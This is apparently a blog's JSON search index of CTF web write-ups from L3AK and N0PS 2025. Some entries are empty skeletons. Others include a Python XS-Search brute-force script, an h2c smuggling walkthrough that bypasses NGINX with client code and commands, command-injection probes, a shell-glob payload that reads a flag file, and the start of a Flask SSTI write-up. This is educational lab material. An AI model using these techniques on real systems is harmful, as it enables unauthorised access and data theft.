[{"content":"Challenge Overview CTF: L3AK CTF 2025 Challenge: Certay Category: Web Exploitation Points: 241 (76 solves) Description: Probably you need to understand our language to get some of the super powers?\nAuthor: CEA Challenge source (will update this when the ctf ends for reproducibility)\nTL;DR Initial Analysis Task Analysis Exploitation Conclusions References ","permalink":"https://hxuu.github.io/blog/ctf/l3ak25/certay/","summary":"\u003ch2 id=\"challenge-overview\"\u003eChallenge Overview\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eCTF: L3AK CTF 2025\u003c/li\u003e\n\u003cli\u003eChallenge: Certay\u003c/li\u003e\n\u003cli\u003eCategory: Web Exploitation\u003c/li\u003e\n\u003cli\u003ePoints: 241 (76 solves)\u003c/li\u003e\n\u003cli\u003eDescription:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eProbably you need to understand our language to get some of the super powers?\u003c/p\u003e\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003eAuthor: \u003ca href=\"https://discord.com/users/534808546580365331\"\u003eCEA\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003ca href=\"https://ctf.l3ak.team/files/2034823b16fc7fb26d63f3021db312fc/Certay_dist.zip?token=eyJ1c2VyX2lkIjoyMjE0LCJ0ZWFtX2lkIjoxMDU5LCJmaWxlX2lkIjo3OH0.aHTFqQ.dp0btV2I-hvI5JAmjxfTXAz9R8k\"\u003eChallenge source (will update this when the ctf ends for reproducibility)\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"tldr\"\u003eTL;DR\u003c/h2\u003e\n\u003ch2 id=\"initial-analysis\"\u003eInitial Analysis\u003c/h2\u003e\n\u003ch2 id=\"task-analysis\"\u003eTask Analysis\u003c/h2\u003e\n\u003ch2 id=\"exploitation\"\u003eExploitation\u003c/h2\u003e\n\u003ch2 id=\"conclusions\"\u003eConclusions\u003c/h2\u003e\n\u003ch2 id=\"references\"\u003eReferences\u003c/h2\u003e","title":"L3AK25: Writeup for Web/Certay"},{"content":"Challenge Overview CTF: L3AK CTF 2025 Challenge: Window of Opportunity Category: Web Exploitation Points: 68 (98 solves) Description: The admin bot loves opening URLs. I implemented CSRF protection, but it seems as though I\u0026rsquo;m forgetting something. Can you find the issue?\nAuthor: p._.k Challenge source (will update this when the ctf ends for reproducibility)\nTL;DR Initial Analysis Task Analysis Exploitation Conclusions References ","permalink":"https://hxuu.github.io/blog/ctf/l3ak25/window-of-opportunity/","summary":"\u003ch2 id=\"challenge-overview\"\u003eChallenge Overview\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eCTF: L3AK CTF 2025\u003c/li\u003e\n\u003cli\u003eChallenge: Window of Opportunity\u003c/li\u003e\n\u003cli\u003eCategory: Web Exploitation\u003c/li\u003e\n\u003cli\u003ePoints: 68 (98 solves)\u003c/li\u003e\n\u003cli\u003eDescription:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThe admin bot loves opening URLs. I implemented CSRF protection, but it seems as though I\u0026rsquo;m forgetting something. Can you find the issue?\u003c/p\u003e\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003eAuthor: \u003ca href=\"https://discord.com/users/1267886144306282621\"\u003ep._.k\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003ca href=\"https://ctf.l3ak.team/files/58130345fb4a47991e6e300c2e1d700f/Window_of_Opportunity.zip?token=eyJ1c2VyX2lkIjoyMjE0LCJ0ZWFtX2lkIjoxMDU5LCJmaWxlX2lkIjo4M30.aHTF4w.SEkbbzHkXSqGaB4QYVssHFDAywU\"\u003eChallenge source (will update this when the ctf ends for reproducibility)\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"tldr\"\u003eTL;DR\u003c/h2\u003e\n\u003ch2 id=\"initial-analysis\"\u003eInitial Analysis\u003c/h2\u003e\n\u003ch2 id=\"task-analysis\"\u003eTask Analysis\u003c/h2\u003e\n\u003ch2 id=\"exploitation\"\u003eExploitation\u003c/h2\u003e\n\u003ch2 id=\"conclusions\"\u003eConclusions\u003c/h2\u003e\n\u003ch2 id=\"references\"\u003eReferences\u003c/h2\u003e","title":"L3AK25: Writeup for Web/Window_of_Opportunity"},{"content":"Challenge Overview CTF: L3AK CTF 2025 Challenge: Notorious Note Category: Web Exploitation Points: 50 (135 solves) Description: Casual coding vibes\u0026hellip;until the notes start acting weird.\nAuthor: S1mple Challenge source (will update this when the ctf ends for reproducibility)\nTL;DR Initial Analysis Task Analysis Exploitation Conclusions References ","permalink":"https://hxuu.github.io/blog/ctf/l3ak25/notorious-note/","summary":"\u003ch2 id=\"challenge-overview\"\u003eChallenge Overview\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eCTF: L3AK CTF 2025\u003c/li\u003e\n\u003cli\u003eChallenge: Notorious Note\u003c/li\u003e\n\u003cli\u003eCategory: Web Exploitation\u003c/li\u003e\n\u003cli\u003ePoints: 50 (135 solves)\u003c/li\u003e\n\u003cli\u003eDescription:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003eCasual coding vibes\u0026hellip;until the notes start acting weird.\u003c/p\u003e\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003eAuthor: \u003ca href=\"https://discord.com/users/621008731773206538\"\u003eS1mple\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003ca href=\"https://ctf.l3ak.team/files/d5d05524a7bccce4d6d0133d32f1a339/dist.zip?token=eyJ1c2VyX2lkIjoyMjE0LCJ0ZWFtX2lkIjoxMDU5LCJmaWxlX2lkIjo0OH0.aHTF1g.JEZMO0_qlBTX5pdghp8AhZxwe5Q\"\u003eChallenge source (will update this when the ctf ends for reproducibility)\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"tldr\"\u003eTL;DR\u003c/h2\u003e\n\u003ch2 id=\"initial-analysis\"\u003eInitial Analysis\u003c/h2\u003e\n\u003ch2 id=\"task-analysis\"\u003eTask Analysis\u003c/h2\u003e\n\u003ch2 id=\"exploitation\"\u003eExploitation\u003c/h2\u003e\n\u003ch2 id=\"conclusions\"\u003eConclusions\u003c/h2\u003e\n\u003ch2 id=\"references\"\u003eReferences\u003c/h2\u003e","title":"L3AK25: Writeup for Web/Notorious_Note"},{"content":"Challenge Overview CTF: L3AK CTF 2025 Challenge: Flag L3ak Category: Web Exploitation Points: 50 (698 solves) Description: What\u0026rsquo;s the name of this CTF? Yk what to do üòâ\nAuthor: p._.k Challenge source (will update this when the ctf ends for reproducibility)\nTL;DR The application is vulnerable to a side-channel attack known as XS-Search, a subclass of XS-Leaks. By observing differences in server responses based on 3-character search queries, we reconstructed the flag one character at a time.\nThe leak occurs due to redacted content masking the real flag but not filtering it out entirely, allowing us to detect its presence via a simple YES/NO oracle.\nInitial Analysis At first glance, this is a simple blog-style website. You can search blog posts, and if a post matches your query, it shows up.\nWhile testing the search, a suspicious post titled Real flag fr with a decoy flag (L3AK{Bad_bl0g?}) shows up. It\u0026rsquo;s obviously a decoy and I was met with \u0026ldquo;Flag incorrect\u0026rdquo; on CTFd.\nMore interestingly though, another post contains redacted content - a string of asterisks (*). This might hint that our query matches the real flag but the characters are hidden.\nLet\u0026rsquo;s confirm that by reading the source.\nProject structure . ‚îú‚îÄ‚îÄ Dockerfile ‚îú‚îÄ‚îÄ index.js ‚îú‚îÄ‚îÄ package.json ‚îú‚îÄ‚îÄ package-lock.json ‚îî‚îÄ‚îÄ public ‚îî‚îÄ‚îÄ index.html 2 directories, 5 files Key Code: index.js const FLAG = \u0026#39;L3AK{t3mp_flag!!}\u0026#39;; ... app.post(\u0026#39;/api/search\u0026#39;, (req, res) =\u0026gt; { const { query } = req.body; if (!query || typeof query !== \u0026#39;string\u0026#39; || query.length !== 3) { return res.status(400).json({ error: \u0026#39;Query must be 3 characters.\u0026#39; }); } const matchingPosts = posts .filter(post =\u0026gt; post.title.includes(query) || post.content.includes(query) || post.author.includes(query) ) .map(post =\u0026gt; ({ ...post, content: post.content.replace(FLAG, \u0026#39;*\u0026#39;.repeat(FLAG.length)) })); res.json({ results: matchingPosts, count: matchingPosts.length, query }); }); We observe the following:\nSearch is restricted to 3-character queries. Matching happens on full content, but redaction (*) happens after the match. The flag is still matched, just hidden on display, just like this: .map(post =\u0026gt; ({ ...post, content: post.content.replace(FLAG, \u0026#39;*\u0026#39;.repeat(FLAG.length)) })); This means we can‚Äôt see the flag, but we can detect its presence. Let\u0026rsquo;s check the challenge description again: what\u0026rsquo;s the name of the CTF, leak it is. Mhmmm~\nTask Analysis The discrepancy between redacted (but matched) content and completely absent content gives us an oracle:\n‚ÄúIs this 3-character substring part of the real flag?‚Äù\nan oracle refers to a mechanism that reveals binary (YES/NO) information about a question. If we ask a YES or NO question and can receive a response, we call that an oracle. By sliding a 3-character window across a partially guessed flag prefix (L3AK{), we can confirm or reject each new character.\nThis is a classic XS-Leak, where the attacker observes side-channel differences (not the actual data) to reconstruct a secret.\nXS-Leaks Overview Cross-Site Leaks (XS-Leaks) are vulnerabilities where attackers infer private information by observing application behavior (response times, redirects, error codes, or even content shapes) without ever accessing the data directly.\nIn our case, the oracle is binary:\nIf a redacted string appears (********), the queried 3-char substring is part of the flag. If the result is empty, it‚Äôs not. XS-Search (Our Case) This specific subclass of XS-Leaks is known as XS-Search.\nWeb applications often support search endpoints, and if those endpoints leak differences in behavior for private vs. public data, attackers can extract secrets via controlled probing.\nIn our case, the shape of the JSON response reveals whether a 3-character probe is valid:\nResponse when match is found (includes redacted flag): { \u0026#34;results\u0026#34;: [ { \u0026#34;id\u0026#34;: 3, \u0026#34;title\u0026#34;: \u0026#34;Not the flag?\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;Well luckily the content of the flag is hidden so here it is: ************************\u0026#34;, \u0026#34;author\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;date\u0026#34;: \u0026#34;2025-05-13\u0026#34; }, { \u0026#34;id\u0026#34;: 4, \u0026#34;title\u0026#34;: \u0026#34;Real flag fr\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;Forget that other flag. Here is a flag: L3AK{Bad_bl0g?}\u0026#34;, \u0026#34;author\u0026#34;: \u0026#34;L3ak Member\u0026#34;, \u0026#34;date\u0026#34;: \u0026#34;2025-06-13\u0026#34; } ], \u0026#34;count\u0026#34;: 2, \u0026#34;query\u0026#34;: \u0026#34;L3A\u0026#34; } Response when no match: {\u0026#34;results\u0026#34;:[],\u0026#34;count\u0026#34;:0,\u0026#34;query\u0026#34;:\u0026#34;K{X\u0026#34;} There is also a decoy flag (in post.id == 4) that is not redacted. To avoid false positives, we only treat hits containing * as real.\nExploitation Armed with our oracle, we brute-force the flag as follows:\nEstablish a baseline of the response content where a hit occurs (\u0026rsquo;*\u0026rsquo; in the json) brute-force the first charcter after known (query = L3AK{a) If the response is a hit, then add one more character (?q=L3AK{aa); otherwise try a new one (?q=L3AK{b). In the end, a full flag (?q=L3AK{flag_here}) can be leaked. Like this:\n#!/usr/bin/env python3 import string import requests URL = \u0026#39;http://34.134.162.213:17000/api/search\u0026#39; alphabet = string.printable.strip() known = \u0026#39;L3AK{\u0026#39; print(f\u0026#34;[+] Starting brute-force with prefix: {known}\u0026#34;) while not known.endswith(\u0026#39;}\u0026#39;): found = False for c in alphabet: probe = (known + c)[-3:] r = requests.post(URL, json={\u0026#34;query\u0026#34;: probe}) data = r.json() # Filter out decoy match (like post id 4) by checking for masked content for post in data.get(\u0026#39;results\u0026#39;, []): if \u0026#39;*\u0026#39; in post[\u0026#39;content\u0026#39;]: print(f\u0026#34;[+] Match found via mask for \u0026#39;{probe}\u0026#39; ‚Üí adding \u0026#39;{c}\u0026#39; to flag\u0026#34;) known += c found = True break if found: break if not found: print(\u0026#34;[-] No matching character found: maybe charset is wrong or flag ended.\u0026#34;) break print(f\u0026#34;\\n‚úÖ Final reconstructed flag: {known}\u0026#34;) Flag is: L3AK{L3ak1ng_th3_Fl4g??}\nConclusions Redacting sensitive data without removing it from search logic introduces oracles. Even seemingly harmless APIs (like search) can leak secrets via side-channels. XS-Leaks can be exploited without authentication or special privileges. Always apply redaction before matching, or remove sensitive data from queries entirely. Validating response shape consistency is crucial when designing secure APIs. References xsleaks.dev: The canonical guide to XS-Leaks and browser side-channels. XS-Search (xsleaks.dev): Specific pattern used in this challenge. string.printable ‚Äì Python Docs: Charset used in the brute-force script. ","permalink":"https://hxuu.github.io/blog/ctf/l3ak25/flag-l3ak/","summary":"The application is vulnerable to a side-channel attack known as XS-Search, a subclass of XS-Leaks. By observing differences in server responses based on 3-character search queries, we reconstructed the flag one character at a time.","title":"L3AK25: Writeup for Web/Flag_L3ak"},{"content":"Challenge Overview CTF: N0PS CTF 2025 Challenge: Plotwist Category: Web Exploitation Points: 500 (1 solves) Description: You stand on the edge of your final test. One choice, one letter, will determine your fate and you must prove yourself worthy of the path you take. No more gray, you must choose a side : Light or dark.\nSo time to ask jojo the question : which side of me are you?\nChoose carefully, for this moment will define who you truly are and remember, the hardest choices often lead to the greatest destiny.\nAuthors: Sto Source code: NONE This challenge is an instance based challenge (source here after it\u0026rsquo;s published)\nTL;DR This writeup covers the solution to the \u0026ldquo;Plotwist\u0026rdquo; web challenge from N0PS CTF 2025, which involves bypassing NGINX access controls to reach a restricted API endpoint.\nWe exploit an h2c smuggling vulnerability by crafting an HTTP/2 cleartext request using a custom Python client. This allows us to bypass the proxy and access /api/noopsy. The final step uses a clever shell expansion trick to read the flag from a filtered shell environment.\nInitial Analysis At a glance, this is as minimalistic as a web application could get. We\u0026rsquo;ve got a form that we can write into, and two options to pick which \u0026lsquo;person\u0026rsquo; to send this letter to: either lordhttp or noopsy.\nSo lordhttp lets us through, whereas noopsy doesn\u0026rsquo;t. Interesting~\nTask Analysis Upon further exploration, I found nothing else of interest. The app is so simple: allow one request, block the other. So it should be easy to know what we should do: bypass the access control.\nChecking the response header of the requests, we see that the backend is behind a reverse proxy, NGINX, specifically. So he, might be the one dropping our request before it ever reaches the backend.\nThis asymmetric behavior suggests that the proxy (NGINX) and the backend may handle requests differently.\nThis could mean:\nThe proxy is enforcing access controls or filtering certain paths/methods. The backend is more permissive, but it‚Äôs hidden behind NGINX. If we can find a way to bypass NGINX and talk to the backend directly, we might access restricted functionality.\nThe only problem is: NGINX inspects everything, and once it sees a request to /api/noopsy, it simply blocks it.\nSo is there a way to make NGINX stop looking?\nAs crazy as it seems, yes, there is. But before I talk about it, you need to know how the web works.\n1. How the Web Works At a high level, we have three entities that usually interact:\nA browser that sends an HTTP request to an edge server. The edge server acts like a gatekeeper: it applies security filters and decides what gets passed to the backend. The backend processes the request and sends the response back to the edge server, which forwards it to you. Edge servers here are called reverse proxies, namely NGINX.\n2. What is Request Smuggling? To evade these proxies, you need to secretly and maliciously pass a request you\u0026rsquo;re not supposed to pass to the server. This is called smuggling a request.\nThese attacks however are hard to achieve (or maybe I got skill issues?). They require a timing effect that makes NGINX process part of the request and leave the other part for the backend.\nBut what if we didn‚Äôt have to trick the proxy and could just smuggle a request by design? Here\u0026rsquo;s where h2c upgrades come into play. Let\u0026rsquo;s investigate this further.\n3. Request Smuggling Via HTTP/2 Cleartext (h2c) Taken from Jake Miller\u0026rsquo;s research. Big thanks for making this information public. To understand this vulnerability, we need to grasp a few core ideas about the underlying technology that powers web communication.\n3.1. TCP HTTP, aka hyper text transfer protocol is just that: a protocol, ie a way to structure data to the end consumer. That data is transmitted via another protocol: TCP.\nTCP transfers byte-encoded HTTP data over the wire. It doesn‚Äôt understand HTTP, just raw binary (0s and 1s).\nA proxy that can interpret HTTP is Layer 7-aware. One that only sees TCP is Layer 4-aware. Layer 4 proxies can‚Äôt comprehend URLs, paths, or HTTP headers‚Äîjust bytes.\n3.2. The Upgrade Header You‚Äôve probably heard of WebSockets, the real-time protocol that enables instant communication between backend and client. To use WebSockets, we must upgrade an HTTP connection to a raw TCP connection.\nWe do that with an Upgrade: websocket header, which tells the proxy: \u0026ldquo;I‚Äôll be talking fast, stop inspecting things deeply‚Äîjust pass along the bytes.\u0026rdquo;\n3.2. Proxy Behavior on Protocol Upgrade Turns out, some proxies disable security checks completely once a connection is upgraded. They no longer inspect traffic at Layer 7, losing the ability to enforce access controls.\nWhile we don‚Äôt want to send WebSocket data, we can upgrade to HTTP/2 over cleartext (h2c), a newer revision of HTTP/1.1 that achieves the same bypass, without encryption and while dodging access control.\nYou can read more about the vulnerability here\nExploitation Armed with this new knowledge, we exploit the vulnerability like so:\nFirst, create a TCP connection and send an HTTP/2 upgrade header: Upgrade: h2c After the server responds with a 101 Switching Protocols, we use the now-unmonitored TCP connection to send HTTP/2 requests directly to the target, bypassing NGINX. Unfortunately, h2c upgrades don‚Äôt work over TLS (the challenge uses https:// btw), so tools like curl won‚Äôt help, they will reject the upgrade as it contradicts the sepc.\nTo get around this, we\u0026rsquo;ll have to create our own client using Python\u0026rsquo;s hyper-h2 library. I\u0026rsquo;ll show you how.\nNote: The following code is heavily inspired by BishopFox‚Äôs h2csmuggler.py. All credit to Jake Miller. I‚Äôm just explaining it in my own way.\nBuilding the Client 1. Creating the TCP Connection import socket def create_tcp_connection(proxy_url): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) context = ssl.create_default_context() context.check_hostname = False retSock = context.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLS) retSock.connect((proxy_url.hostname, 443)) return retSock Here we establish a TCP connection using Python\u0026rsquo;s socket library.\nWe point to a TCP connection/socket using file descriptors (as everything in linux is a file), hence why we return the socket.\n2. Sending the Initial HTTP/1.1 Request def send_initial_request(connection, proxy_url): path = proxy_url.path or \u0026#34;/\u0026#34; request = ( b\u0026#34;GET \u0026#34; + path.encode(\u0026#39;utf-8\u0026#39;) + b\u0026#34; HTTP/1.1\\r\\n\u0026#34; + b\u0026#34;Host: \u0026#34; + proxy_url.hostname.encode(\u0026#39;utf-8\u0026#39;) + b\u0026#34;\\r\\n\u0026#34; + b\u0026#34;Accept: */*\\r\\n\u0026#34; + b\u0026#34;Accept-Language: en\\r\\n\u0026#34; + b\u0026#34;Upgrade: h2c\\r\\n\u0026#34; + b\u0026#34;HTTP2-Settings: \u0026#34; + b\u0026#34;AAMAAABkAARAAAAAAAIAAAAA\u0026#34; + b\u0026#34;\\r\\n\u0026#34; + b\u0026#34;Connection: Upgrade, HTTP2-Settings\\r\\n\u0026#34; + b\u0026#34;\\r\\n\u0026#34; ) connection.sendall(request) The HTTP2-Settings headers defines the terms by which client and server communicate (max concurrent streams\u0026hellip;etc). Connection: Upgrade, HTTP2-Settings tells the server that the request wants to upgrade to HTTP/2 and that it wants to use the HTTP2-Settings for upgrade negotiation. 3. Creating H2 Connection Object \u0026amp; Sending Smuggled Request Assuming the latter request gave a 101 Switching Protocols status code. Let\u0026rsquo;s now send our HTTP/2 requests.\nHTTP/2 is a binary framed protocol. In simple terms, it doesn\u0026rsquo;t depend on raw text data like Http/1.x do (\\r\\n to be precise). So data is encapsulated in clear binary format. The object that handles this encapsulation is H2Connection.\nIt‚Äôs like a translator: you tell it what you want to say (e.g., send a request), and it gives you raw bytes to send over the wire.\nimport h2.connection # This doesn\u0026#39;t create a network connection # h2_connection only gives binary data that WE OURSELVES send through the original tcp connection h2_connection = h2.connection.H2Connection() def sendSmuggledRequest(h2_connection, connection, args): stream_id = h2_connection.get_next_available_stream_id() smuggled_request_headers = [ (\u0026#39;:method\u0026#39;, \u0026#39;GET\u0026#39;), (\u0026#39;:scheme\u0026#39;, \u0026#39;http\u0026#39;), (\u0026#39;:authority\u0026#39;, \u0026#39;localhost\u0026#39;), (\u0026#39;:path\u0026#39;, \u0026#39;/api/noopsy\u0026#39;), # the bypassed path ] # Prepare the headers from python\u0026#39;s format into binary format h2_connection.send_headers(stream_id, smuggled_request_headers) # Actually send the data connection.sendall(h2_connection.data_to_send()) Now that we sent the HTTP/2 request, we need to receive the response.\nWhen you communicate over HTTP/2 using the h2 library, the server sends data and signals as part of the protocol, which might include things like:\nIncoming requests Responses Stream lifecycle changes Flow control updates Server push notifications And more\u0026hellip; The h2 library abstracts these incoming signals into ‚Äúevents.‚Äù\nTo handle those \u0026ldquo;events\u0026rdquo;, we have to receive raw data from the network and process it as follows:\n# get the data using socket.recv() events = getData(h2_connection, connection) def handle_events(events, isVerbose): for event in events: if isinstance(event, ResponseReceived): # Handle response headers for name, value in event.headers: print(f\u0026#34;{name.decode(\u0026#39;utf-8\u0026#39;)}: {value.decode(\u0026#39;utf-8\u0026#39;)}\u0026#34;) elif isinstance(event, DataReceived): # Handle response body data print(event.data.decode(\u0026#39;utf-8\u0026#39;, \u0026#39;replace\u0026#39;)) Combining Everything Together Now that we know how Jake Miller\u0026rsquo;s PoC works, we can use it to bypass nginx\u0026rsquo;s access controls as follows:\npython3 h2csmuggler.py -x \u0026#34;https://nopsctf-\u0026lt;INSTANCE_ID\u0026gt;-plotwist-1.chals.io/api/lordhttp\u0026#34; \u0026#34;http://localhost/api/noopsy\u0026#34; Where:\n-x, --proxy PROXY is the proxy server to try to bypass http://localhost/api/noopsy is the smuggled URL The command as it is will send a GET request to /api/lordhttp and /api/noopsy, but the application accepts POST requests to both, does it accept GET requests? Let\u0026rsquo;s try:\nWe could\u0026rsquo;ve send some OPTIONS/HEAD methods to verify that the server actually sends an allow: GET header, but testing it this way is faster.\nh2csmuggler on ÓÇ† master [!] via üêπ via üêç v3.13.3 ‚ûú python3 h2csmuggler.py -x \u0026#34;https://nopsctf-dcdefb599276-plotwist-1.chals.io/api/lordhttp\u0026#34; \u0026#34;http://localhost/api/noopsy\u0026#34; [INFO] h2c stream established successfully. :status: 200 content-length: 46 content-type: application/json date: Wed, 04 Jun 2025 13:12:22 GMT server: hypercorn-h2 {\u0026#34;msg\u0026#34;:\u0026#34;Hello from the other side, Lord HTTP\u0026#34;} nopsctf-dcdefb599276-plotwist-1.chals.io/api/lordhttp - 200 - 46 [INFO] Requesting - /api/noopsy :status: 200 content-length: 100 content-type: application/json date: Wed, 04 Jun 2025 13:12:23 GMT server: hypercorn-h2 {\u0026#34;msg\u0026#34;:\u0026#34;Got a secret, can you keep it? Well this one, I\u0026#39;ll save it in the secret_flag.txt file ^.^\u0026#34;} localhost/api/noopsy - 200 - 100 There we go~ Sto is kind enough to save the flag in a secret_flag.txt file, all we have to do is read that flag!\nGetting the Flag (or so I Think?) We now know /api/noopsy accepts POST requests. We test for command injection using:\n; whoami | id \u0026amp;\u0026amp; uname -a $(id) But\u0026hellip; Nothing worked :(\nThe server responds with a riddle.\nLet‚Äôs decode it:\nMoney -\u0026gt; This could mean $, which can refer to environment variables Talk in dollars or digits, or don‚Äôt even try -\u0026gt; allowed characters are $, [0-9] Got a question? I‚Äôll answer you away -\u0026gt; maybe even ? is allowed? Mhmmm, how can we read a file using only those character: $, [0-9] and ?\nIt turns out, there is quite a creative way to solve this, but it all depends on the same concept: shell expansion\nShell Expansion (the Real Deal) When you\u0026rsquo;re working in your shell, and type something like: rm *, you might think that the rm command treats the character * differently and removes every file in the current directory. However, you\u0026rsquo;d be wrong!\nYour shell expands * and replaces it with every file inside the current directory, so something like:\nrm * becomes:\nrm file1 file2 file3...etc BEFORE the command executes.\nWe can use this trick to execute commands AND supply filenames without needing to actually type letters in the terminal. More specifically, we can do this:\n$0 ??????????????? Where:\n$0 -\u0026gt; holds the name of the script or command being executed. The one I\u0026rsquo;m TRUSTING will give the flag based on the phrase: \u0026ldquo;I‚Äôll answer you away\u0026rdquo; ? matches exactly one character -\u0026gt; 15 of them match secret_flag.txt Putting this all together (with some grep magic of course), we end up with:\n‚ûú python3 h2csmuggler.py -x \u0026#34;https://nopsctf-dcdefb599276-plotwist-1.chals.io/api/lordhttp\u0026#34; -XPOST -d \u0026#39;{\u0026#34;letter\u0026#34;: \u0026#34;$0 ???????????????\u0026#34;}\u0026#39; \u0026#34;http://localhost/api/noopsy\u0026#34; | grep -oP N0PS{.*?} N0PS{4nD_I_FE3l_50m37h1nG_5o_wR0nG_d01nG_7h3_r18h7_7h1nG} Flag is: N0PS{4nD_I_FE3l_50m37h1nG_5o_wR0nG_d01nG_7h3_r18h7_7h1nG}\nConclusions The challenge exploited an h2c (HTTP/2 cleartext) request smuggling vulnerability to bypass NGINX access controls. HTTP/2 upgrade allowed sending unfiltered requests directly to the backend, circumventing proxy restrictions. Custom Python client using hyper-h2 was needed due to limitations with standard HTTP/2 tools over TLS. The flag retrieval required understanding shell expansion and limited input filtering to craft a valid command injection payload. The writeup highlights the importance of protocol-level nuances in web security and proxy behavior. References Bishop Fox ‚Äì H2C Smuggling Explained\nBlog post: H2C Smuggling Request Video explainer: YouTube: \u0026ldquo;Smuggling HTTP Requests with H2C\u0026rdquo; RFC 7540 ‚Äì HTTP/2 Specification\nMultiplexing and stream behavior: RFC 7540 ¬ß5 ‚Äì Streams and Multiplexing H2C Upgrade Mechanics\nVideo: YouTube: \u0026ldquo;H2C Cleartext HTTP/2 Exploits\u0026rdquo; Python library docs: hyper-h2 Usage Guide Shows how to manually craft and send HTTP/2 requests over cleartext using hyper-h2, since standard clients like curl block such behavior due to spec violations. Transport Layer Security, TLS 1.2 and 1.3 (Explained by Example)\n","permalink":"https://hxuu.github.io/blog/ctf/n0ps25/plotwist/","summary":"This writeup covers the solution to the \u003cstrong\u003e\u0026ldquo;Plotwist\u0026rdquo;\u003c/strong\u003e web challenge from N0PS CTF 2025, which involves bypassing NGINX access controls to reach a restricted API endpoint.","title":"N0PS25: Writeup for Web/Plotwist"},{"content":"Challenge Overview CTF: N0PS CTF 2025 Challenge: Casin0ps Category: Web Exploitation Points: 484 (21 solves) Description: Have you ever been to the Casino of Webtopia yet? Well, we count on you to find out what it hides! Authors: Sto, algorab Source code: NONE Link to the challenge (I\u0026rsquo;ll update it to the source after the challenge is down)\nTL;DR A Flask-based web application echoing user-provided data via a CSV export feature. By inspecting response headers, we confirm it‚Äôs a Flask app and identify Jinja2 templating. The export functionality naively injects username/email into a template, leading to Server-Side Template Injection (SSTI).\nWe chain the Flask request object to reach __builtins__ and import subprocess to execute commands. Finally, we automate the exploit to retrieve the flag from the exported CSV.\nInitial Analysis At a glance, the app appears to be a simple casino interface: users register, log in, and play a luck-based game to win a jackpot However, the ‚Äúgame‚Äù is clearly rigged‚Äîeven if you ‚Äúwin,‚Äù the target sum increases, making it impossible to profit.\nAnother feature is exporting user data as a CSV file containing their username, email, number of plays, and net gains.\nUSERNAME,hxuu MAIL,hxuu@hxuu.hxuu INSCRIPTION DATE,2025-06-02 06:06:19 MONEY,994.0 STATS,\u0026#34;{\\\u0026#34;played\\\u0026#34;: 16, \\\u0026#34;avg_gain\\\u0026#34;: -0.375}\u0026#34; Since the UI doesn\u0026rsquo;t show much, let\u0026rsquo;s dive into the page source:\nNote: In challenges without source code, it‚Äôs helpful to proceed methodically: inspect the HTML source, then monitor network traffic, and finally test individual functionalities.\nPage Source (Ctrl+U) \u0026lt;!-- Condensed version of the source (including the login/register, and main game) --\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;nav\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;/logout\u0026#34;\u0026gt;Logout\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;/export\u0026#34;\u0026gt;Export account data\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;div id=\u0026#34;app\u0026#34;\u0026gt; \u0026lt;script\u0026gt;(function () { // Mapping const emojiMap = { \u0026#34;7\u0026#34;: \u0026#34;7Ô∏è‚É£‚Äã\u0026#34;, \u0026#34;100\u0026#34;: \u0026#34;üíØ\u0026#34;, \u0026#34;coin\u0026#34;: \u0026#34;ü™ô‚Äã\u0026#34;, \u0026#34;rocket\u0026#34;: \u0026#34;üöÄ‚Äã\u0026#34;, \u0026#34;party\u0026#34;: \u0026#34;üéâ‚Äã\u0026#34;, \u0026#34;skull\u0026#34;: \u0026#34;üíÄ\u0026#34; }; function spin() { fetch(\u0026#34;/play\u0026#34;, { method: \u0026#34;GET\u0026#34;, credentials: \u0026#34;include\u0026#34;, }) .then(response =\u0026gt; { if (response.status === 401) { window.location.href = \u0026#34;/login\u0026#34;; return; } return response.json(); }) \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; We notice 4 endpoints corresponding to the visible features:\n/register: Handles new user registration. /login: Authenticates existing users. /play: Executes the game logic. /export: Generates a CSV with user data (username, email, plays, gains). Nothing in the HTML hints at dangerous behavior. Let‚Äôs move on to network traffic.\nNetwork Traffic Analysis By observing requests and responses, we see:\nThe Server header reveals Werkzeug, a Python WSGI utility library commonly used with Flask. WSGI is created for different python web servers to share a common interface to web application development\nThe Set-Cookie header after login shows a session cookie that appears to be a Flask-signed cookie (using itsdangerous library). Flask-Unsign can decode these cookies to confirm a Flask backend:\nflask-unsign --decode --cookie \u0026#34;\u0026lt;cookie_value\u0026gt;\u0026#34; If we obtain valid JSON, it‚Äôs almost certain the app is using Flask‚Äôs default session mechanism.\nReadable text! It seems that we\u0026rsquo;re sure what we\u0026rsquo;re dealing with: a Flask application.\nMy initial thoughts when solving this challenge were to check common Flask/Werkzeug vulnerabilities.\nI tried looking for Werkzeug 3.0.4 vulnerabilities but was faced with only a single path traversal one that works only on Windows boxes with python version prior to 3.11. This app is not vulnerable 